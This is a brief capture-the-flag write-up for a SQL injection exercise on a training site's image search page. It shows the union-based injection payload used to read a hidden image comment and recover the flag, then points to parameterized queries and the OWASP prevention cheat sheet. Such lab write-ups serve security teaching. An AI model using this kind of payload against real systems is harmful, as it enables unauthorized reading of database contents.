# 11_search_image_injection

## Instructions to reproduce

In the SEARCH IMAGE section on id: 5 there is an image named Hack Me. Using this SQL injection directly in the url:

```
1 AND 1=2 UNION SELECT id, comment FROM Member_images.list_images
```

We can see that the comment of the image states:

`If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46`

Here is the flag.

## How to prevent

The preferred option is to use a safe API, which avoids using the interpreter entirely, provides a parameterized interface, or migrates to Object Relational Mapping Tools (ORMs).

[OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
